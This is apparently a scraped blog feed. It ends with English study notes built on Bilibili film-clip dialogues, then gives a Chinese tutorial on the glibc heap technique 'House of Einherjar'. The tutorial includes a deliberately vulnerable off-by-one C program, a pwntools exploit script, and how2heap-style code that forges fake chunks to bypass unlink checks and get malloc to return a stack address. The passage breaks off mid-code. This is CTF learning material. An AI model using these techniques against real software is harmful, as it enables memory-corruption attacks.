长出，留长</li><li>bangs 刘海</li></ul><h2 id="8-13"><a href="#8-13" class="headerlink" title="8.13"></a>8.13</h2><p><a href="https://www.bilibili.com/video/BV1fv4y1y7uk">https://www.bilibili.com/video/BV1fv4y1y7uk</a></p><p>hey,tina</p><p>what‘t up ,gemma,Can I borrow some milk</p><p>我能借点牛奶吗</p><p>Sure ,what kind do you want ,we have almond，oat，coconut，macadamia</p><p>当然，你要什么样的，我们有杏仁的，燕麦的，椰子的，夏威夷果的</p><p>OH，So you don’t have milk,I just go to the store</p><p>哦，你没有普通牛奶，我还是去商店买吧</p><p>wait，hang on，hang on，Before you go,I got you a present，It’t  for our one year anniversary as friends</p><p>等下，先别走，我给你准备了礼物，纪念我们一周年的友谊</p><ul><li>hang on 等一下</li><li>one year anniversary 一周年纪念</li></ul><h2 id="8-14"><a href="#8-14" class="headerlink" title="8.14"></a>8.14</h2><p><a href="https://www.bilibili.com/video/BV1Zs4y147nv">https://www.bilibili.com/video/BV1Zs4y147nv</a></p><p>have you ever heard of a labord’s chameleon</p><p>你听说过xxx变色龙吗</p><p>can’t say i have</p><p>没听说过</p><p>it’s alizard species in madagascar.The females lay their eggs before the winter and then all the adults die before thry hatch</p><p>是马达加斯加的一种蜥蜴，雌性蜥蜴会在冬天来临前下点，然后所有成年蜥蜴在蛋孵化前就走向生命终点</p><p>so. from the minute you born,no parents，you’re totally on your own</p><p>所以你一出生就没父母，完全靠自己</p><ul><li><p>chameleon 变色龙，善变的人</p><p>Opponents called him a political chameleon for shifting his position on a range of issues</p><p>反对者称他是政治变色龙，因为他在一系列问题上改变了立场</p></li><li><p>hatch v.孵化，孵出 密谋策划</p></li><li><p>species  物种，种类</p></li></ul><h2 id="8-15"><a href="#8-15" class="headerlink" title="8.15"></a>8.15</h2><p><a href="https://www.bilibili.com/video/BV168411A7fJ">https://www.bilibili.com/video/BV168411A7fJ</a></p><p>how did it go?</p><p>怎么样</p><p>It went good ,it was great actually</p><p>不错，实际上相当棒</p><p>did he say anything</p><p>他说什么了吗</p><p>My agency said if the pictures turned out good ,he might consider them for an editorial ,Do you think he would</p><p>我经济公司说，要是照片效果不错，他会考虑做时尚型录用，你觉得会吗</p><p>I think he makes a lot of promises to young girls</p><p>我觉的他给年轻姑娘们做了太多许诺</p><p>I should go before my meter runs out</p><p>我该走了 ，停车时间快用完了</p><ul><li><p>turn out 结果是</p><p>waiting to seeing how things turn out</p><p>等着看事情的发展</p></li></ul><h2 id="8-16"><a href="#8-16" class="headerlink" title="8.16"></a>8.16</h2><p><a href="https://www.bilibili.com/video/BV1pG4y1C7dm/">https://www.bilibili.com/video/BV1pG4y1C7dm/</a></p><p>A great true crime mystery unpeels itslef ,like an onion</p><p>解开案件的谜团往往就像剥洋葱一样，要层层递进逐层剥脱</p><p>First the crime ,then the characters ,and then their secrets</p><p>首先要弄清案件，再了解案件人物，最后直掏他们内心之隐密</p><p>The secrets are the fun part.who‘s telling the truth,who is laying What are then hiding</p><p>秘密才是最有意思的，谁言真，孰言假，真假背后隐藏了什么</p><ul><li><p>unpeel 剥…的皮</p><p>we are going to unpeel the layers of assumptions</p><p>我们将要剥去假设的外衣</p></li></ul><h2 id="8-17"><a href="#8-17" class="headerlink" title="8.17"></a>8.17</h2><p><a href="https://www.bilibili.com/video/BV1Dd4y1V7da/">https://www.bilibili.com/video/BV1Dd4y1V7da/</a></p><p>good morning</p><p>早上好</p><p>good morning,how are you today (i ditn’t really care how he was today,but i had learn to ask anyway)</p><p>早，你今天咋样，(我并不在乎他怎么样，但我学会了还是要问候一下)</p><p>i‘m quite wall ,thank you for asking</p><p>我很好，谢谢关心</p><p>i had a，uh，protein-rich breakfast that i ingested out side in the garden ,the weather was quite mild</p><p>我今天在外面的花园享用了富含蛋白质的早餐，天气很温和</p><ul><li>protein-rich adj.富含蛋白质的</li><li>mild 温和的</li><li>ingest 摄取；咽下；吸收；接待</li></ul><h2 id="8-18"><a href="#8-18" class="headerlink" title="8.18"></a>8.18</h2><p><a href="https://www.bilibili.com/video/BV1AY411X7u1/">https://www.bilibili.com/video/BV1AY411X7u1/</a></p><p>what’s going on</p><p>怎么了</p><p>Something’s wrong with sheldon</p><p>sheleon有点不对</p><p>What’s the matter baby ,have to tummy ache</p><p>怎么了宝贝，肚子痛吗</p><p>I think it’s an ulcer</p><p>我觉得是溃疡</p><p>Don’t be silly ,you must’ve eaten someting ,No. my sympthoms are consistent with an ulcer</p><p>别傻了，你一定是吃坏了什么东西了，没有.我的症状和溃疡一模一样</p><ul><li><p>tummy n.肚子</p></li><li><p>symptoms n.症状</p></li><li><p>be consistent with 与什么相一致</p></li></ul><h2 id="8-19"><a href="#8-19" class="headerlink" title="8.19"></a>8.19</h2><p><a href="https://www.bilibili.com/video/BV1HM411B7et/">https://www.bilibili.com/video/BV1HM411B7et/</a></p><p>How may I help you ?</p><p>有什么能邦你的，</p><p>Hi i’m just looking for some new glasses</p><p>我想买一副新眼镜</p><p>Pippa is the best at picking out frames</p><p>最会挑镜框了</p><p>Really,Did you bring your prescription</p><p>是吗，你带处方了吗</p><p>No I actually haven’t had my eyes checked in,like a few years.It might ‘ve changed</p><p>没，其实我好几年没检测过眼睛了，度数可能有变化</p><ul><li>prescription处方，药方</li></ul><h2 id="8-20"><a href="#8-20" class="headerlink" title="8.20"></a>8.20</h2><p><a href="https://www.bilibili.com/video/BV1xd4y1W7rR/">https://www.bilibili.com/video/BV1xd4y1W7rR/</a></p><p>Hey you surprised to see me</p><p>看到我很惊讶吗</p><p>Well you proved youself again kid。That was some swan dive you took</p><p>你用那个燕式跳水再一次证明了自己</p><p>You were just gonna leave me back there</p><p>你打算丢下我</p><p>It would’t do any good havin us both locked up.Somebody had to get the cross</p><p>我们都被关起来没什么好处</p><p>Holy shit ，you got it .Hey mabe I should hold on to that for….</p><p>天啊，你拿到了</p><p>What ,you don’t trust me</p><p>你不信任我?</p><ul><li>dive v.跳水，潜水</li></ul><h2 id="8-21"><a href="#8-21" class="headerlink" title="8.21"></a>8.21</h2><p><a href="https://www.bilibili.com/video/BV1xR4y1b7BR">https://www.bilibili.com/video/BV1xR4y1b7BR</a></p><p>Paying off the balance</p><p>来交余款吗</p><p>Actually I came for an extension ,i need more time</p><p>实际上，我是来申请延期的，我需要更多时间</p><p>how much</p><p>多久</p><p>I don’t know ,I sorta hit a financial snag</p><p>我不知道，我遇到了点经济方面的困难</p><p>Miss danisels ,If I could help I would ,but I’ve already agree to keep    this property off the market for two full weeks for you that’s the best I can do、</p><p>小姐，如果我能帮你的话，我一定会帮，但是我已经答应为你保留这栋房产整整两个星期，这是我能做的最好了</p><ul><li>balance 平衡 余款</li><li>extension 延期，拓展</li></ul><h2 id="8-22"><a href="#8-22" class="headerlink" title="8.22"></a>8.22</h2><p><a href="https://www.bilibili.com/video/BV1rG4y1S7WA/">https://www.bilibili.com/video/BV1rG4y1S7WA/</a></p><p>so,that’s why you became a nanny?</p><p>这也是你去当保姆的原因吗</p><p>yes beacause when my  father found out ,hec cut me off</p><p>是的，因为我爸爸发现我辍学后，断了我的钱袋</p><p>Oh ,i am sorry,it’s harsh</p><p>真替你伤心，那太残酷了</p><p>no,it’s wonderful ,i mean i’d much rather have my freedom</p><p>不，这样才好呢，我宁愿拥有自由</p><p>otherwise i’d be living a very predictable life in china</p><p>不让我只能在中国过这一眼望到底的生活</p><p>you know it’s funny,i grew up with nannies,and now i am one</p><p>有意思的是我小时候被保姆带大，如今我却成了保姆</p><ul><li><p>cut off切断，中断，隔绝</p><p>cut him off from his followers</p><p>阻断他和他粉丝的联系</p></li><li><p>harsh 恶劣的，艰苦的；严厉的</p><p>that can survive in harsh environments</p><p>那样能在恶劣环境中生存下去</p></li><li><p>predictable 可预测的，可预料的；老套乏味的</p><p>your predictable output</p><p>你的可预期的产量</p></li></ul><h2 id="8-23"><a href="#8-23" class="headerlink" title="8.23"></a>8.23</h2><p>i’m not sure how i feel about the whole auditioning thing in general</p><p>我不太确定我对整个试镜这件事的感觉如何</p><p>i’m not sure it’s that good for me.i might just give it a break</p><p>我不太确定是不是适合我，我可能要歇一歇</p><p>what’s wrong with you?what</p><p>你怎么了，什么</p><p>that sounds like quite a healthy chice ,I haven’t heard you make one of those in a very long time</p><p>这听起来是一个明智的选择，我已经很长一段时间没听到你有这样的想法了</p><ul><li>auditioning v.试镜</li></ul><h2 id="8-24"><a href="#8-24" class="headerlink" title="8.24"></a>8.24</h2><p><a href="https://www.bilibili.com/video/BV1z84y1V7Rg/">https://www.bilibili.com/video/BV1z84y1V7Rg/</a></p><p>and now ,we return to our first hockey game.</p><p>现在我们回到了第一次冰球比赛的赛场</p><p>Okay but that hockey game was our first fight.</p><p>好吧，但是那场冰球比赛是我们第一次吵架</p><p>I don’t know why we need to memorialize our first fight on our last date.</p><p>我不明白为什么要在我们最后一次约会纪念我们第一次吵架</p><p>First fight is momentous</p><p>第一次吵架是极为重要的</p><ul><li>memorialize vt.纪念，请愿</li><li>momentous 重要的，重大的</li></ul><h2 id="8-25"><a href="#8-25" class="headerlink" title="8.25"></a>8.25</h2><p><a href="https://www.bilibili.com/video/BV1Rx4y1L7Qt">https://www.bilibili.com/video/BV1Rx4y1L7Qt</a></p><p>Where are you going, you’re note going anywhere .</p><p>你去哪儿，你哪也不能去</p><p>whatever</p><p>我就不听</p><p>susan gardner,get your ass back in the house on the count of three or you’re grounded</p><p>susan gardner我数到三给我滚回屋里去，否则你就被禁足了</p><p>what makes you think you’re so in control of what i do? </p><p>你凭什么认为你能控制我做什么？</p><p>i don’t think .I know.it’s so fack</p><p>我就是知道，事实如此</p><ul><li>on the count of three 数到三</li></ul><h2 id="8-26"><a href="#8-26" class="headerlink" title="8.26"></a>8.26</h2><p><a href="https://www.bilibili.com/video/BV1yx4y1j7E2/">https://www.bilibili.com/video/BV1yx4y1j7E2/</a></p><p>charles，you’re not understanding me ,if my husband finds out that i had an affair he will file for divorce。he will do anything</p><p>你没明白我的意思，如果我丈夫发现我有外遇，他会起诉离婚，他什么都做的出来</p><p>what do you mean?</p><p>什么意思</p><p>he’ll take my daughter.</p><p>他会夺走我的女儿</p><p>really</p><p>yes , you don’t know him .he’s not like you</p><p>是的，你不了解他，他和你不一样</p><ul><li>divorce n.离婚 分开</li><li>have an affair 有外遇</li></ul><h2 id="8-27"><a href="#8-27" class="headerlink" title="8.27"></a>8.27</h2><p><a href="https://www.bilibili.com/video/BV1vM4y1X7Vs/">https://www.bilibili.com/video/BV1vM4y1X7Vs/</a></p><p>all right,so there are all these question for your profile that you can answer if you want to or note.</p><p>好了，这些针对个人资料的问题，你想不想回答都行</p><p>Like religious views.political views,prople who inspire you.</p><p>比如宗教信仰，政治立场，谁激励你</p><p>jules ostin</p><p>i am not trying to brown-nose you,but i’ve been in business a long time and i’ve never run across anyone quite like you. you do inspire.jules</p><p>我不是想拍你马屁，但我在商业邻域待了很久，我没遇见过想你这样的人，jules，你真的有激励性</p><ul><li>brown nose 拍马屁</li></ul><h2 id="8-28"><a href="#8-28" class="headerlink" title="8.28"></a>8.28</h2><p><a href="https://www.bilibili.com/video/BV1LR4y1z7B6">https://www.bilibili.com/video/BV1LR4y1z7B6</a></p><p>when my anxiety is hight ,it feels like an absolute inability to make decisions</p><p>当我严重焦虑的时候，就感觉我无法做出决定。</p><p>Like ,I would rather not do something than decide what to do</p><p>比如，我宁愿一些事我干脆就不做了也不想去做决定</p><p>and it’s almost paralyzing which is odd,cuz it seems like it’s simple</p><p>这几乎令人崩溃，但这很奇怪因为做决定看起来很简单</p><p>do you want go on a walk ,or sit on the couch and watch tv</p><p>你想散步还是坐在沙发上看电视</p><p>and i’m like ,i can’t figure that out .I don’t have the brain power</p><p>我就没办法选择，我没那个脑力</p><ul><li><p>absolute 完全的，绝对的</p></li><li><p>inability to do sth 没能力去做什么事</p><p>our inability to understand how they’re doing</p><p>我们无法理解他们是怎么做到的</p></li><li><p>paralyz 使瘫痪</p><p>they’re getting paralyz from the waist down</p><p>他们腰部以下都瘫痪了</p></li><li><p>odd 奇怪的，反常的，偶尔的</p></li></ul><h2 id="8-29"><a href="#8-29" class="headerlink" title="8.29"></a>8.29</h2><p><a href="https://www.bilibili.com/video/BV1bD4y1N78S/">https://www.bilibili.com/video/BV1bD4y1N78S/</a></p><p>Does he have to spend the rest of his life with someone he doesn’t love to spare her feelings</p><p>难道他会为了不伤害她的感情而和不爱的人共度余生吗</p><p>It’s love ,It’s not a game played fair ,there are no rules</p><p>这是爱情，这不是一个公平的游戏，没有规则</p><p>Now maybe she hasn’t committed a crime yet.but i know jackie ,She will. She always settled her scores</p><p>现在可能他还没有犯罪，但我了解jackie，他会的，他总是报仇雪恨 </p><ul><li><p>spare someone’s feelings 避免让某人难过</p><p>lying to someone in order to spare their feelings</p></li></ul><p>​对某人撒谎使为了避免他们难过</p><ul><li>committe a crime 犯罪</li><li>settle the scores  算旧账</li></ul><h2 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h2><p><a href="https://www.bilibili.com/video/BV1s54y1N7KQ">https://www.bilibili.com/video/BV1s54y1N7KQ</a></p><p>My mother‘s bipolar and my father’s an alcoholic and an addict</p><p>我妈妈患有躁郁症，而我父亲是个酒鬼和瘾君子</p><p>He takes what he pleases and he offers nothing .No money.No support</p><p>他只会享受却从不付出，不给钱也不出力</p><p>i’ve done what i could to help raise my siblings ,i wish i could’ve done more</p><p>我已经尽我所能抚养我的弟妹们，我希望我能做的更多些</p><ul><li>bipolar 有两级的，患有躁郁症的</li><li>alcoholic 酒精的，n.酒鬼</li><li>addict n. 瘾君子</li><li>siblings 兄弟姐妹</li></ul><h2 id="8-31"><a href="#8-31" class="headerlink" title="8.31"></a>8.31</h2><p><a href="https://www.bilibili.com/video/BV138411u72d/">https://www.bilibili.com/video/BV138411u72d/</a></p><p>the teenage years are limbo,you’re somewhere between being a kid and and adult</p><p>青少年时期是不知如何是好的尴尬阶段，你既不是孩子也不是大人</p><p>and the world tells you to be mature and express yourself，but the minute that you do it,it tells you to shut up</p><p>然而全世界告诉你要变得成熟，要表达自己，但是当你刚一这么做，全世界又叫你要闭嘴</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House Of Einherjar</title>
      <link href="/2023/07/29/House-Of-Einherjar/"/>
      <url>/2023/07/29/House-Of-Einherjar/</url>
      
        <content type="html"><![CDATA[<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>一般就是有off by one可以覆盖previnuse位，释放时会触发下面的合并</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="wiki上的例子"><a href="#wiki上的例子" class="headerlink" title="wiki上的例子"></a>wiki上的例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span>* s0 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);　<span class="comment">//构造fake chunk</span></span><br><span class="line">    <span class="type">char</span>* s1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">char</span>* s2 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);　</span><br><span class="line">    <span class="type">char</span>* s3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">//为了不让s2与top chunk 合并</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, s0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s0\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s0, <span class="number">0x200</span>); <span class="comment">//读入fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s1\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s1, <span class="number">0x19</span>); <span class="comment">//Off By One</span></span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./example&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;begin\n&quot;</span>)</span><br><span class="line">address = <span class="type">int</span>(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s0\n&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(address) * <span class="number">2</span> + <span class="string">&quot;A&quot;</span>*<span class="number">0xe0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p64(address) * <span class="number">2</span>是为了绕过</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) <span class="meta">#fake size</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s1\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x220</span>) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>在s1通过堆块的空间复用，在s2的prevsize写上0x220,并用off by one把previnuse位置零，</p><p>s2堆情况</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730141511488.png" alt="image-20230730141511488"></p><p>s1-prevsize找到假堆块进行unlink操作，假堆块s0还需要绕过unlink里下面的检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) \</span><br><span class="line">malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>下面的图if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) \绕过</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142117126.png" alt="image-20230730142117126"></p><p>下面的图if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))\绕过</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142455457.png" alt="image-20230730142455457"></p><p>free(s2)后就可以把s0 0x7ac010放入unsortedbin了</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142640857.png" alt="image-20230730142640857"></p><h3 id="how2heap例子"><a href="#how2heap例子" class="headerlink" title="how2heap例子"></a>how2heap例子</h3><p>来自hollk师傅博客的简化版，上一个例子如果把伪造堆伪造到栈上会因为堆块太大，导致申请不出来，办法就是和topchunk合并后申请</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="comment">//gcc -g hollk.c -o hollk //glibc-2.23  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span>* a;</span><br><span class="line">  <span class="type">uint8_t</span>* b;</span><br><span class="line">  <span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">  a = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding:%#x\n&quot;</span>, real_a_size);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//在栈上伪造fake chunk</span></span><br><span class="line">  <span class="type">size_t</span> fake_chunk[<span class="number">6</span>]; </span><br><span class="line">  fake_chunk[<span class="number">0</span>] = <span class="number">0</span>; </span><br><span class="line">  fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>;</span><br><span class="line">  fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"></span><br><span class="line">  b = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">  <span class="comment">//模拟off by one将b previnuse位置零</span></span><br><span class="line">  a[real_a_size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//模拟利用地址复用写b的prevsize</span></span><br><span class="line">  *(<span class="type">size_t</span>*)&amp;a[real_a_size - <span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"><span class="comment">//绕过unlink /if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  检查</span></span><br><span class="line">  fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"><span class="comment">//unlink合并后会和topchunk合并</span></span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//可以把fake_chunk申请出来</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/h/glibc_2<span class="number">.31</span>&gt; ./a.out</span><br><span class="line">a: <span class="number">0xccf010</span></span><br><span class="line">Since we want to overflow <span class="string">&#x27;a&#x27;</span>, we need the <span class="string">&#x27;real&#x27;</span> size of <span class="string">&#x27;a&#x27;</span> after rounding:<span class="number">0x38</span></span><br><span class="line">Our fake chunk at <span class="number">0x7fff767b3280</span> looks like:</span><br><span class="line">b: <span class="number">0xccf050</span></span><br><span class="line"></span><br><span class="line">b.size: <span class="number">0x101</span></span><br><span class="line">b.size: <span class="number">0x100</span></span><br><span class="line">Our fake prev_size will be <span class="number">0xccf040</span> - <span class="number">0x7fff767b3280</span> = <span class="number">0xffff80008a51bdc0</span></span><br><span class="line">Our fake chunk size is now <span class="number">0xffff80008a53cd81</span> (b.size + fake_prev_size)</span><br><span class="line">Next <span class="built_in">malloc</span>(<span class="number">0x200</span>) is at <span class="number">0x7fff767b3290</span></span><br></pre></td></tr></table></figure><p>绕过unlink大小的检测只需要*(fake_chunk+size)&#x3D;size就行了，所以可以用下面的方法，用下面的方法因为时0x100大小是unsortedbin就不用把largebin才会用到的fd_nextsize和bk_nextsize覆写了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> fake_chunk[<span class="number">6</span>]; </span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; </span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>;</span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line"><span class="comment">/* fake_chunk[4] = (size_t)fake_chunk; */</span></span><br><span class="line"><span class="comment">/* fake_chunk[5] = (size_t)fake_chunk; */</span></span><br><span class="line">fake_chunk[<span class="number">0x100</span>/<span class="number">8</span>]=<span class="number">0x100</span>;<span class="comment">//绕过if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  </span></span><br><span class="line">把后面的fake_chunk[<span class="number">1</span>] = fake_size;注释掉</span><br></pre></td></tr></table></figure><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><h3 id="how2heap例子-1"><a href="#how2heap例子-1" class="headerlink" title="how2heap例子"></a>how2heap例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prepare the target</span></span><br><span class="line">  <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span>*)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// create a fake chunk</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  